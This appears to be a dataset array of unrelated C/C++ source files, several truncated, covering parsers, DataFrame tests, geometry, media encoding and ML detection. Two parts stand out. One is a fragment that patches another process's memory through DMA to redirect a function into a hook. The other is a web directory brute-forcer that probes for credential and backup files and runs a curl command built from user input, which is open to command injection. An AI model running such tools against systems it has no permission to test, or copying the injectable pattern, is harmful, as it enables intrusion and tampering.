codecave = find_codecave(function_size, process_name, module);\n\t\tif (!codecave)\n\t\t\tcontinue;\n\t\tcodecaves.push_back(codecave);\n\t}\n\treturn codecaves;\n}\n\nbool c_shellcode::call_function(void* hook, void* function, const std::string& process_name)\n{\n\tint pid = mem.GetPidFromName(process_name);\n\n\tBYTE jmp_bytes[14] = {\n\t\t0xff, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp [RIP+0x00000000]\n\t\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // RIP value\n\t};\n\n\t// Set jump address\n\t*reinterpret_cast<uint64_t*>(jmp_bytes + 6) = reinterpret_cast<uintptr_t>(hook);\n\n\tauto orig_bytes = std::unique_ptr<uint8_t[]>(new uint8_t[sizeof(jmp_bytes)]);\n\tif (!mem.Read(reinterpret_cast<uintptr_t>(function), orig_bytes.get(), sizeof(jmp_bytes), pid))\n\t\treturn 0;\n\n\tif (!VMMDLL_MemWrite(mem.vHandle, pid, reinterpret_cast<uintptr_t>(function), jmp_bytes, sizeof(jmp_bytes)))\n\t{\n\t\tLOG(\"[!] 1 Failed to write memory at 0x%p\\n\", function);\n\t\treturn false;\n\t}\n\n\tSleep(100);\n\n\t//Restore function\n\tif (!VMMDLL_MemWrite(mem.vHandle, pid, reinterpret_cast<uintptr_t>(function), orig_bytes.get(), sizeof(jmp_bytes)))\n\t{\n\t\tLOG(\"[!] 2 Failed to write memory at 0x%p\\n\", function);\n\t\treturn false;\n\t}\n\n\treturn true;\n}\n",
    "#include \"parser.h\"\n#include \"../lexer/lexer.h\"\n\nParser::Parser(std::vector<Token> tokens) : tokens(tokens) {};\n\n\nvoid Parser::advance(int* current) {\n\t(*current)++;\n\tif (tokens[*current].type == TokenType::NEWLINE) {\n\t\tpos.line++;\n\t\tpos.column = 0;\n\t}\n\telse {\n\t\tpos.column++;\n\t}\n}\n\n\nValue Parser::parse_value(int* current) {\n    if (tokens[*current].type == TokenType::HASH) {\n\n        ImmediateValue valueImmediate{};\n        valueImmediate.type = ImmediateValueType::INTEGER;\n        advance(current);\n        if (tokens[*current].type != TokenType::NUMBER) {\n            // Handle error: Expected number token after '#'\n        }\n        valueImmediate.value = std::stoi(tokens[*current].literal);\n\t\t//advance(current);\n\n        return valueImmediate;\n\n    }\n    else if (tokens[*current].type == TokenType::HEX) {\n\n        ImmediateValue valueHex{};\n        valueHex.type = ImmediateValueType::HEXADECIMAL;\n        valueHex.value = std::stoi(tokens[*current].literal, nullptr, 16);\n\t\t//advance(current);\n        return valueHex;\n\n    }\n    else if (tokens[*current].literal == \"r\") {\n\n\t\tRegister registered{};\n        advance(current);\n        if (tokens[*current].type != TokenType::HEX) {\n            // Handle error: Expected hexadecimal token after 'r'\n        }\n        registered.value = std::stoi(tokens[*current].literal, nullptr, 16);\n\t\t//advance(current);\n        return registered;\n\n    }\n    else {\n\t\tstd::cerr << \" Handle error: Unexpected token type \\\"\" << tokens[*current].literal <<\"\\\"\\n\";\n\t\tstd::exit(0);\n        // Handle error: Unexpected token type\n    }\n}\n\n\nProgram Parser::parse() {\n\tProgram program = { {} };\n\tint index = 0;\n\twhile (tokens[index].type != TokenType::END && tokens[index].type != TokenType::NEWLINE) {\n\t\tprogram.instructions.push_back(parse_instruction(&index));\n\t}\n\n\treturn program;\n}\n\nInstruction Parser::parse_instruction(int* current) {\n\tInstruction instruction;\n\tif (tokens[*current].type != TokenType::INSTRUCTION) {\n\t\t// error handling\n\t}\n\tinstruction.instruction = tokens[*current].literal;\n\tadvance(current);\n\n\twhile (*current < tokens.size() && tokens[*current].type != NEWLINE && tokens[*current].type != TokenType::END) {\n\t\tinstruction.inputs.push_back(parse_value(current));\n\t\tif (*current < tokens.size() && (tokens[*current].type != NEWLINE && tokens[*current].type != TokenType::END)) {\n\t\t\tadvance(current);\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\n\t\tif ((tokens[*current].type == COMMA)) advance(current);\n\n\t}\n\tif (*current < tokens.size() && (tokens[*current].type == NEWLINE)) {\n\t\tadvance(current); \n\t}\n\n\treturn instruction;\n}\n",
    "#include \"../src/DataFrame.hpp\"\n#include <iostream>\n#include <vector>\n\nint main() {\n    try {\n        // Create a DataFrame with three columns\n        DataFrame df({\"ID\", \"Name\", \"Score\"});\n\n        // Add rows of data\n        df.addRow(1, \"Alice\", 92.5);\n        df.addRow(2, \"Bob\", 88.0);\n        df.addRow(3, \"Charlie\", 79.5);\n\n        // Print out the DataFrame information\n        cout << \"DataFrame has \" << df.getColumnCount() << \" columns and \"\n                  << df.getRowCount() << \" rows.\" << endl;\n\n        // Assuming DataFrame has a method to print its content\n        // This part is pseudocode and needs actual implementation in DataFrame\n        df.print();\n        cout << endl;\n\n        // Test deleting the column \"Name\"\n        df.dropColumn(\"Name\");\n        df.print();\n        cout << endl;\n\n        // Test the method addColumn\n        df.addColumn(\"Status\", string(\"Off\"));\n        df.addColumn(\"Grade\", 'F');\n        df.addColumn(\"Value\", 0);\n        df.print();\n        cout << endl;\n\n        // Test the method dropRow over the second row (index 1)\n        df.dropRow(1);\n        df.print();\n        cout << endl;\n\n        df.addRow(2, 100.0, string(\"On\"), 'A', 1);\n        df.addRow(4, 100.0, string(\"On\"), 'A', 1);\n        df.print();\n        cout << endl;\n\n        // Test the method printColumnTypes\n        df.printColumnTypes();\n        cout << endl;\n\n        DataFrame dfAge({\"Age\", \"Salary\", \"Name\"});\n        \n        // Adding some rows to the DataFrame\n        dfAge.addRow(25, 50000, \"John\");\n        dfAge.addRow(30, 60000, \"Alice\");\n        dfAge.addRow(35, 70000, \"Bob\");\n        dfAge.addRow(40, 80000, \"Charlie\");\n        dfAge.addRow(45, 90000, \"David\");\n        dfAge.addRow(50, 100000, \"Emma\");\n        dfAge.addRow(55, 110000, \"Frank\");\n        dfAge.addRow(60, 120000, \"Grace\");\n        dfAge.addRow(65, 130000, \"Henry\");\n        dfAge.addRow(70, 140000, \"Isabella\");\n        dfAge.addRow(75, 150000, \"Jack\");\n        dfAge.addRow(80, 160000, \"Kate\");\n        dfAge.addRow(85, 170000, \"Liam\");\n        dfAge.addRow(90, 180000, \"Mia\");\n        dfAge.addRow(95, 190000, \"Noah\");\n        dfAge.addRow(100, 200000, \"Olivia\");\n\n        cout << \"Original DataFrame (before filtering)\" << endl;\n        dfAge.print();\n        \n        // Filter rows where Age is less than 35\n        dfAge.filterByColumn(\"Age\", 35, CompareOperation::GREATER_THAN_OR_EQUAL);\n        cout << \"DataFrame after filtering (Age >= 35)\" << endl;\n        dfAge.print();\n\n        // Filter rows where Salary is greater than 100000\n        dfAge.filterByColumn(\"Salary\", 100000, CompareOperation::LESS_THAN);\n        cout << \"DataFrame after filtering (Salary < 100000)\" << endl;\n        dfAge.print();\n\n        // Filter rows where Name is not \"Bob\"\n        dfAge.filterByColumn(\"Name\", \"Bob\", CompareOperation::NOT_EQUAL);\n        cout << \"DataFrame after filtering (Name != Bob)\" << endl;\n        dfAge.print();\n\n        // Create two DataFrames with same column names\n        DataFrame df1({\"timestamp\", \"sensor1\", \"sensor2\", \"origin\"});\n        DataFrame df2({\"timestamp\", \"sensor1\", \"sensor2\", \"origin\"});\n\n        // Adding rows to df1\n        df1.addRow(1, 10, 100.0, string(\"DataFrame1\"));\n        df1.addRow(3, 11, 110.0, string(\"DataFrame1\"));\n        df1.addRow(5, 12, 120.0, string(\"DataFrame1\"));\n        df1.addRow(7, 13, 130.0, string(\"DataFrame1\"));\n        df1.addRow(9, 14, 140.0, string(\"DataFrame1\"));\n        df1.print();\n        cout << endl;\n\n        // Adding rows to df2\n        df2.addRow(2, 15, 150.0, string(\"Dataframe2\"));\n        df2.addRow(4, 16, 160.0, string(\"Dataframe2\"));\n        df2.addRow(6, 17, 170.0, string(\"Dataframe2\"));\n        df2.addRow(8, 18, 180.0, string(\"Dataframe2\"));\n        df2.addRow(10, 19, 190.0, string(\"Dataframe2\"));\n        df2.addRow(12, 20, 200.0, string(\"Dataframe2\"));\n        df2.addRow(14, 21, 210.0, string(\"Dataframe2\"));\n        df2.addRow(16, 22, 220.0, string(\"Dataframe2\"));\n        df2.addRow(18, 23, 230.0, string(\"Dataframe2\"));\n        df2.addRow(20, 24, 240.0, string(\"Dataframe2\"));\n        df2.print();\n        cout << endl;\n\n        // Merge the DataFrames ordered by the \"timestamp\" column\n        DataFrame merged = DataFrame::mergeOrdered(df1, df2, \"timestamp\");\n\n        // Print the merged DataFrame\n        merged.print();\n        cout << endl;\n\n        // Test the deep copy method\n        cout << \"Testing the deep copy method\" << endl;\n        DataFrame dfCopy = DataFrame::deepCopy(df, true);\n\n        cout << \"Original DataFrame\" << endl;\n        df.print();\n        cout << \"Copy DataFrame\" << endl;\n        dfCopy.print();\n\n        cout << \"Let's change both DataFrames\" << endl;\n        df.addRow(100, 100.0, string(\"On\"), 'A', 1);\n        dfCopy.addRow(200, 200.0, string(\"Off\"), 'B', 2);\n\n        cout << \"Original DataFrame\" << endl;\n        df.print();\n        cout << \"Copy DataFrame\" << endl;\n        dfCopy.print();\n\n        cout << endl;\n\n        cout << \"Test the concat metho",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <cstdlib> // For system() function\n#include <fstream> // For file output\n#include <thread> // For parallel requests\n#include <mutex> // For thread safety\n#include <unordered_set> // For storing unique URLs\n\n// Global mutex for thread-safe output\nstd::mutex mtx;\n\n// Function to perform directory and file enumeration (enhanced version)\nvoid performEnumeration(const std::string& baseUrl, const std::vector<std::string>& dirFileNames, std::ofstream& outputFile, std::unordered_set<std::string>& foundUrls) {\n    for (const auto& name : dirFileNames) {\n        std::string url = baseUrl + \"/\" + name;\n        std::string curlCommand = \"curl -s -L -o /dev/null -w '%{http_code}' \" + url;\n        std::string curlOutput = \"\";\n        FILE* curlStream = popen(curlCommand.c_str(), \"r\");\n        if (curlStream) {\n            char buffer[128];\n            while (!feof(curlStream)) {\n                if (fgets(buffer, sizeof(buffer), curlStream) != NULL) {\n                    curlOutput += buffer;\n                }\n            }\n            pclose(curlStream);\n\n            // Check if the HTTP status code is 200 OK or 302 Found\n            if (curlOutput.find(\"200\") != std::string::npos || curlOutput.find(\"302\") != std::string::npos) {\n                mtx.lock(); // Lock mutex for thread-safe access to foundUrls\n                if (foundUrls.find(url) == foundUrls.end()) { // Check if URL is not already found\n                    outputFile << url << \" - Found\" << std::endl;\n                    foundUrls.insert(url); // Add URL to foundUrls set\n                }\n                mtx.unlock(); // Unlock mutex\n            }\n        }\n    }\n}\n\nint main() {\n    std::string websiteUrl;\n    std::vector<std::string> dirFileNames = {\n        \"admin\", \"backup\", \"login\", \"test\", \"wp-admin\", \"robots.txt\", \"sitemap.xml\", \"README.md\",\n        \"images\", \"uploads\", \"css\", \"js\", \"fonts\", \"cgi-bin\" , \"bin\" , \"conf\" , \"data\" , \"db\" , \n        \"docs\" , \"downloads\" , \"include\" , \"js\" , \"lib\" , \"logs\" , \"media\" , \"modules\" , \n        \"mode-modules\" , \"phpmyadmin\" , \"script\" , \"src\" , \"temp\" , \"test\" , \"var\" , \"www\" , \n        \".htaccess\" , \"LICENSE.txt\" , \"web.config\" , \"config.php\" , \"index.php\" , \"login.php\" , \n        \"admin.php\" , \"backup.sql\" , \"database.sql\" , \"report.pdf\" , \"credentials.txt\" , \"config.json\", \n        \"app.js\" , \"package.json\" , \"webpack.config.js\", \"Dockerfile\" , \"wp-login.php\" , \"phpinfo.php\" , \n        \"mysqladmin\" , \"dev\" , \"debug\" , \"backup\" , \"shell\" , \"logs\" , \"setup\" , \"phpMyAdmin\" , \n        \".env\" , \".git\" , \".svn\" , \"config\" , \"confidential\" , \"dump\" , \"email\" , \"error\" , \"files\" , \n        \"ild_files\" , \"public\" , \"reports\" , \"temp\" , \"tmp\" , \"upload\" , \"web\" , \"admin.txt\" , \n        \"backup.zip\" , \"config.ini\" , \"credentials.json\" , \"db.sql\" , \"error_log\" , \"index.html\" , \n        \"info.php\" , \"login.html\" , \"passwords.txt\" , \"report.doc\" , \"setup.exe\" , \"shell.php\" , \n        \"test.php\" , \"usernames.txt\" , \"error\" , \"include\" , \"register\" , \"report\" , \"backup_files\" , \n        \"config_backup\" , \"development\" , \"devops\" , \"documents\" , \"important\" , \"invoices\" , \n        \"libraries\" , \"media\" , \"private\" , \"public_html\" , \"scripts\" , \"secure\" , \"sessions\" , \n        \"static\" , \"system\" , \"templates\" , \"tools\" , \"admin_panel.php\" , \"backup_db.sql\" , \n        \"config_backup.tar.gz\" , \"credentials_backup.txt\" , \"database_backup.sql\" , \"error_logs.log\" ,\n        \"index.htm\" , \"password_list.txt\" , \"reports_backup.zip\" , \"setup.sh\" , \"shell_script.sh\" ,\n        \"test_page.php\" , \"users_backup.csv\" , \".config\" , \".well-known\" , \"lib\" , \"public_html\" , \n        \"scripts\" , \"secure\", \"sessions\" , \"webroot\" , \".idea\" , \".vscode\" , \"admin_panel\" , \n        \"webapps\" , \"vti_bin/_vti_adm/admin.dll\" , \"vti_bin/_vti_adm/author.dll\" , \n        \"vti_bin/shtml.dll\" , \"vti_cnf\" , \"vti_inf\" , \"vti_log\" , \"vti_map\" , \"vti_pvt\" , \n        \"vti_rpc\" , \"vti_script\" , \"vti_txt\" , \"wp-app\" , \"wp-atom\" , \"wpau-backup\" , \"wp-blog-header\" , \n        \"wpcallback\" , \"wp-comments\" , \"wp-commentsrss2\" , \"wp-config\" , \"wpcontent\" , \"wp-content\" , \n        \"wp-cron\" , \"wp-dbmanager\" , \"wp-feed\" , \"wp-includes\" , \"wp-images\" , \"wp-mail\" , \"wp-pass\" , \n        \"wp-rdf\" , \"wp-register\" , \"wp-rss\" , \"wp-rss2\" , \"wps\" , \"wp-settings\" , \"wp-signup\" , \n        \"wp-syntax\" , \"wp-trackback\" , \"wrap\" , \"ws\" , \"ws_ftp\" , \"WS_FTP\" , \"WS_FTP.LOG\" , \n        \"ws-client\" , \"wsdl\" , \"wstat\" , \"wstats\" , \"wwwlog\" , \"wwwuser\" , \"xajax\" , \"xajax_js\" , \n        \"xcache\" , \"xcart\" , \"xhtml\" , \"xmfiles\" , \"xmlimporter\" , \"xmlrpc\" , \"xml-rpc\" , \n        \"xmlrpc.php\" , \"xmlrpc_server\" , \"xmlrpc_server.php\" , \"xmlrpc_server.php\"\n\n\n        // Add more common directory and file names as needed\n    };\n    std::unordered_set<std::string> foundUrls; // Set to store unique URLs\n\n    std::cout << \"Enter the target website URL to perform directory and file enumeration: \";\n    std::getline(std::cin, websiteUrl);\n\n   ",
    "#include \"segment.hpp\"\n#include \"plane.hpp\"\n#include \"custom_assert.hpp\"\n#include \"double_operations.hpp\"\n\nusing namespace geometry;\nusing namespace doperations;\n\n\nbool segment_t::contains_inter_pnt(const point_t &pnt) const\n{\n    double x_min = std::min(first_.get_x(), second_.get_x()),\n           x_max = std::max(first_.get_x(), second_.get_x()),\n           y_min = std::min(first_.get_y(), second_.get_y()),\n           y_max = std::max(first_.get_y(), second_.get_y()),\n           z_min = std::min(first_.get_z(), second_.get_z()),\n           z_max = std::max(first_.get_z(), second_.get_z());\n\n    return gr_or_eq(pnt.get_x(), x_min) && ls_or_eq(pnt.get_x(), x_max) &&\n           gr_or_eq(pnt.get_y(), y_min) && ls_or_eq(pnt.get_y(), y_max) &&\n           gr_or_eq(pnt.get_z(), z_min) && ls_or_eq(pnt.get_z(), z_max);\n}\n\n\nbool segment_t::intersects_seg(const segment_t &seg2) const\n{\n    line_t seg_line1{vector_t{second_} - vector_t{first_}, first_};\n    line_t seg_line2{vector_t{seg2.second_} - vector_t{seg2.first_}, seg2.first_};\n\n    point_t intersection_pnt{seg_line1.get_line_intersection(seg_line2)};\n\n    if (intersection_pnt.special_check())\n    {\n        if (contains_inter_seg(seg2)) return true;\n        return false;\n    }\n\n    return contains_inter_pnt(intersection_pnt) &&\n      seg2.contains_inter_pnt(intersection_pnt);\n}\n\n\npoint_t segment_t::get_line_intersection(const line_t &line) const\n{\n    if ((dir_vec_.vec_product(line.get_dir_vec()) == NULL_VEC) && !(line.check_point_belong(first_)))\n        return NAN_PNT;\n\n    if ((dir_vec_.vec_product(line.get_dir_vec()) == NULL_VEC) && (line.check_point_belong(first_)))\n        return SPEC_PNT;\n\n    point_t intersection_pnt{seg_line_.get_line_intersection(line)};\n\n    if (contains_inter_pnt(intersection_pnt)) return intersection_pnt;\n    return NAN_PNT;\n}\n\n\nbool segment_t::contains_inter_seg(const segment_t &seg2) const\n{\n    return contains_inter_pnt(seg2.first_) || contains_inter_pnt(seg2.second_) ||\n           seg2.contains_inter_pnt(first_) || seg2.contains_inter_pnt(second_);\n}\n\n\npoint_t segment_t::get_plane_intersection(const plane_t &pln) const\n{\n    ASSERT(is_valid());\n    ASSERT(pln.is_valid());\n\n    point_t pnt = pln.get_line_intersection(seg_line_);\n    if (!pnt.is_valid()) return pnt;\n\n    if (!contains_inter_pnt(pnt)) return NAN_PNT;\n    return pnt;\n}\n\n\nvoid segment_t::print() const\n{\n    std::cout << \"segment:\\n\";\n    first_.print();\n    second_.print();\n}\n",
    "/**************************************************************************************************\r\n *\r\n * Copyright (c) 2019-2023 Axera Semiconductor (Ningbo) Co., Ltd. All Rights Reserved.\r\n *\r\n * This source file is the property of Axera Semiconductor (Ningbo) Co., Ltd. and\r\n * may not be copied or distributed in any isomorphic form without the prior\r\n * written consent of Axera Semiconductor (Ningbo) Co., Ltd.\r\n *\r\n **************************************************************************************************/\r\n\r\n#include <string.h>\r\n#include <dirent.h>\r\n#include <errno.h>\r\n#include <sys/types.h>\r\n#include <unistd.h>\r\n\r\n#include \"utils/jenc.h\"\r\n#include \"utils/logger.h\"\r\n\r\nAX_S32 CreateJenc(VENC_CHN nJencChn, AX_U32 nWidth, AX_U32 nHeight, AX_U32 nQpLevel) {\r\n    AX_VENC_CHN_ATTR_T stVencChnAttr;\r\n    memset(&stVencChnAttr, 0, sizeof(AX_VENC_CHN_ATTR_T));\r\n\r\n    stVencChnAttr.stVencAttr.enMemSource = AX_MEMORY_SOURCE_CMM;\r\n\r\n    stVencChnAttr.stVencAttr.u32MaxPicWidth = MAX_JENC_PIC_WIDTH;\r\n    stVencChnAttr.stVencAttr.u32MaxPicHeight = MAX_JENC_PIC_HEIGHT;\r\n\r\n    stVencChnAttr.stVencAttr.u32PicWidthSrc = nWidth;\r\n    stVencChnAttr.stVencAttr.u32PicHeightSrc = nHeight;\r\n\r\n    stVencChnAttr.stVencAttr.u32BufSize = nWidth * nHeight * 3 / 4; /*stream buffer size*/\r\n\r\n    stVencChnAttr.stVencAttr.u8InFifoDepth = 1;  /* depth of input fifo */\r\n    stVencChnAttr.stVencAttr.u8OutFifoDepth = 1; /* depth of output fifo */\r\n\r\n    stVencChnAttr.stVencAttr.enLinkMode = AX_VENC_UNLINK_MODE;\r\n\r\n    stVencChnAttr.stVencAttr.enType = PT_JPEG;\r\n\r\n    auto nRet = AX_VENC_CreateChn(nJencChn, &stVencChnAttr);\r\n\r\n    if (nRet != 0) {\r\n        ALOGE(\"SKEL AX_VENC_CreateChn[%d](%d X %d, size=%d) fail, ret=0x%x\", nJencChn, nWidth, nHeight, stVencChnAttr.stVencAttr.u32BufSize, nRet);\r\n        return -1;\r\n    }\r\n\r\n    AX_VENC_JPEG_PARAM_T stJpegParam;\r\n    memset(&stJpegParam, 0, sizeof(AX_VENC_JPEG_PARAM_T));\r\n    nRet = AX_VENC_GetJpegParam(nJencChn, &stJpegParam);\r\n    if (nRet != 0) {\r\n        ALOGE(\"SKEL AX_VENC_GetJpegParam[%d] fail\", nJencChn, nRet);\r\n        return AX_ERR_SKEL_ILLEGAL_PARAM;\r\n    }\r\n\r\n    stJpegParam.u32Qfactor = nQpLevel;\r\n\r\n    nRet = AX_VENC_SetJpegParam(nJencChn, &stJpegParam);\r\n    if (nRet != 0){\r\n        ALOGE(\"AX_VENC_SetJpegParam[%d] fail\", nJencChn, nRet);\r\n        return AX_ERR_SKEL_ILLEGAL_PARAM;\r\n    }\r\n\r\n    AX_VENC_RECV_PIC_PARAM_T tRecvParam;\r\n    memset(&tRecvParam, 0x00, sizeof(tRecvParam));\r\n    nRet = AX_VENC_StartRecvFrame(nJencChn, &tRecvParam);\r\n\r\n    if (nRet != 0) {\r\n        ALOGE(\"SKEL AX_VENC_StartRecvFrame[%d] fail, nRet=0x%x\", nJencChn, nRet);\r\n        return AX_ERR_SKEL_ILLEGAL_PARAM;\r\n    }\r\n\r\n    return AX_SKEL_SUCC;\r\n}\r\n\r\nnamespace skel {\r\n    namespace utils {\r\n        CJEnc::CJEnc(AX_VOID) {\r\n        }\r\n\r\n        AX_S32 CJEnc::Create(AX_U32 nWidth, AX_U32 nHeight) {\r\n            if (!m_bPushValid) {\r\n                AX_VENC_MOD_ATTR_T stVencModAttr;\r\n                memset(&stVencModAttr, 0x00, sizeof(stVencModAttr));\r\n                stVencModAttr.enVencType = AX_VENC_MULTI_ENCODER;\r\n                stVencModAttr.stModThdAttr.u32TotalThreadNum = 1;\r\n                stVencModAttr.stModThdAttr.bExplicitSched = AX_FALSE;\r\n                AX_VENC_Init(&stVencModAttr);\r\n\r\n                const char *strSkelVencEnvStr = getenv(SKEL_VENC_CHN_ENV_STR);\r\n                if (strSkelVencEnvStr) {\r\n                    m_nPushJencChn = (VENC_CHN)atoi(strSkelVencEnvStr);\r\n                }\r\n\r\n                m_nWidth = nWidth;\r\n                m_nHeight = nHeight;\r\n\r\n                AX_S32 nRet = CreateJenc(m_nPushJencChn, nWidth, nHeight, m_nQpLevel);\r\n\r\n                if (nRet != 0) {\r\n                    return AX_ERR_SKEL_ILLEGAL_PARAM;\r\n                }\r\n\r\n                m_bPushValid = AX_TRUE;\r\n            }\r\n\r\n            return AX_SKEL_SUCC;\r\n        }\r\n\r\n        AX_S32 CJEnc::Destroy(AX_VOID) {\r\n            if (m_bPushValid) {\r\n                AX_VENC_StopRecvFrame(m_nPushJencChn);\r\n                AX_VENC_DestroyChn(m_nPushJencChn);\r\n\r\n                AX_VENC_Deinit();\r\n\r\n                m_bPushValid = AX_FALSE;\r\n            }\r\n\r\n            return AX_SKEL_SUCC;\r\n        }\r\n\r\n        AX_S32 CJEnc::Get(const AX_VIDEO_FRAME_T &stFrame, AX_SKEL_RECT_T &stRect, AX_U32 &nDstWidth, AX_U32 &nDstHeight,\r\n                          AX_VOID **ppBuf, AX_U32 *pBufSize, AX_U32 nQpLevel) {\r\n            std::lock_guard<std::mutex> lck(m_mtx);\r\n\r\n            if (!ppBuf || !pBufSize) {\r\n                ALOGE(\"nil pointer\");\r\n                return AX_ERR_SKEL_NULL_PTR;\r\n            }\r\n\r\n            AX_S32 nRet = AX_SKEL_SUCC;\r\n            AX_BOOL bJencStreamGet = AX_FALSE;\r\n            AX_VIDEO_FRAME_INFO_T tFrame;\r\n            AX_VENC_STREAM_T stVencStream;\r\n            memset(&stVencStream, 0x00, sizeof(stVencStream));\r\n\r\n            if (stFrame.u32Width * stFrame.u32Height > m_nWidth * m_nHeight) {\r\n                ALOGE(\"not match for input size(%dx%d), init(%dx%d)\",\r\n          ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mlapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <daisy_seed.h>\n\n#include <algorithm>\n#include <span>\n\n#include \"phasedist.h\"\n#include \"vult_daisy.hpp\"\n\nvult2daisy(Phasedist);\n\nusing namespace daisy;\n\nDaisySeed hw;\nMidiUsbHandler midi;\nPhasedist voice;\n\n/** Function that gets called at a regular interval by the hardware to\n *  process, and/or generate audio signals\n */\nvoid AudioCallback(AudioHandle::InputBuffer in, AudioHandle::OutputBuffer out,\n                   size_t size) {\n  voice.ProcessBlock({&in[0][0], size}, {&out[0][0], size});\n}\n\nvoid HandleMidi() {\n  /** Listen to MIDI for new changes */\n  midi.Listen();\n\n  /** When there are messages waiting in the queue... */\n  while (midi.HasEvents()) {\n    /** Pull the oldest one from the list... */\n    auto msg = midi.PopEvent();\n    switch (msg.type) {\n      case NoteOn:\n        voice.NoteOn(msg.AsNoteOn());\n        break;\n\n      case NoteOff:\n        voice.NoteOff(msg.AsNoteOff());\n        break;\n\n      case ControlChange:\n        voice.ControlChange(msg.AsControlChange());\n        break;\n\n      default:\n        break;\n    }\n  }\n}\n\nint main(void) {\n  /** Basic initialization of Daisy hardware */\n  hw.Configure();\n  hw.Init();\n\n  /** Initialize USB Midi\n   *  by default this is set to use the built in (USB FS) peripheral.\n   *\n   *  by setting midi_cfg.transport_config.periph =\n   * MidiUsbTransport::Config::EXTERNAL the USB HS pins can be used (as FS)\n   * for MIDI\n   */\n  MidiUsbHandler::Config midi_cfg;\n  midi_cfg.transport_config.periph = MidiUsbTransport::Config::INTERNAL;\n  midi.Init(midi_cfg);\n\n  /** Initialize our test tone */\n  voice.Init();\n\n  /** And start the audio callback */\n  hw.StartAudio(AudioCallback);\n\n  while (1) {\n    HandleMidi();\n  }\n}\n",
    "#include\"yolo.h\"\nusing namespace std;\nusing namespace cv;\nusing namespace cv::dnn;\n\nbool Yolo::readModel(Net& net, string& netPath, bool isCuda = false) {\n\ttry {\n\t\tnet = readNet(netPath);\n\t}\n\tcatch (const std::exception&) {\n\t\treturn false;\n\t}\n\t//cuda\n\tif (isCuda) {\n\t\tnet.setPreferableBackend(cv::dnn::DNN_BACKEND_CUDA);\n\t\tnet.setPreferableTarget(cv::dnn::DNN_TARGET_CUDA_FP16);\n\t}\n\t//cpu\n\telse {\n\t\tnet.setPreferableBackend(cv::dnn::DNN_BACKEND_DEFAULT);\n\t\tnet.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\n\t}\n\treturn true;\n}\n#if(defined YOLOV5 && YOLOV5==false)  //yolov7\nbool Yolo::Detect(Mat& SrcImg, Net& net, vector<Output>& output) {\n\tMat blob;\n\tint col = SrcImg.cols;\n\tint row = SrcImg.rows;\n\tint maxLen = MAX(col, row);\n\tMat netInputImg = SrcImg.clone();\n\tif (maxLen > 1.2 * col || maxLen > 1.2 * row) {\n\t\tMat resizeImg = Mat::zeros(maxLen, maxLen, CV_8UC3);\n\t\tSrcImg.copyTo(resizeImg(Rect(0, 0, col, row)));\n\t\tnetInputImg = resizeImg;\n\t}\n\tvector<Ptr<Layer> > layer;\n\tvector<string> layer_names;\n\tlayer_names= net.getLayerNames();\n\tblobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(0, 0, 0), true, false);\n\t//\u5982\u679c\u5728\u5176\u4ed6\u8bbe\u7f6e\u6ca1\u6709\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u4f46\u662f\u7ed3\u679c\u504f\u5dee\u5f88\u5927\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4e0b\u7528\u4e0b\u9762\u4e24\u53e5\u8bed\u53e5\n\t//blobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(104, 117, 123), true, false);\n\t//blobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(114, 114,114), true, false);\n\tnet.setInput(blob);\n\tstd::vector<cv::Mat> netOutputImg;\n\tnet.forward(netOutputImg, net.getUnconnectedOutLayersNames());\n\tstd::vector<int> classIds;//\u7ed3\u679cid\u6570\u7ec4\n\tstd::vector<float> confidences;//\u7ed3\u679c\u6bcf\u4e2aid\u5bf9\u5e94\u7f6e\u4fe1\u5ea6\u6570\u7ec4\n\tstd::vector<cv::Rect> boxes;//\u6bcf\u4e2aid\u77e9\u5f62\u6846\n\tfloat ratio_h = (float)netInputImg.rows / netHeight;\n\tfloat ratio_w = (float)netInputImg.cols / netWidth;\n\tint net_width = className.size() + 5;  //\u8f93\u51fa\u7684\u7f51\u7edc\u5bbd\u5ea6\u662f\u7c7b\u522b\u6570+5\n\tfor (int stride = 0; stride < strideSize; stride++) {    //stride\n\t\tfloat* pdata = (float*)netOutputImg[stride].data;\n\t\tint grid_x = (int)(netWidth / netStride[stride]);\n\t\tint grid_y = (int)(netHeight / netStride[stride]);\n\t\tfor (int anchor = 0; anchor < 3; anchor++) {\t//anchors\n\t\t\tconst float anchor_w = netAnchors[stride][anchor * 2];\n\t\t\tconst float anchor_h = netAnchors[stride][anchor * 2 + 1];\n\t\t\tfor (int i = 0; i < grid_y; i++) {\n\t\t\t\tfor (int j = 0; j < grid_x; j++) {\n\t\t\t\t\tfloat box_score = sigmoid_x(pdata[4]); 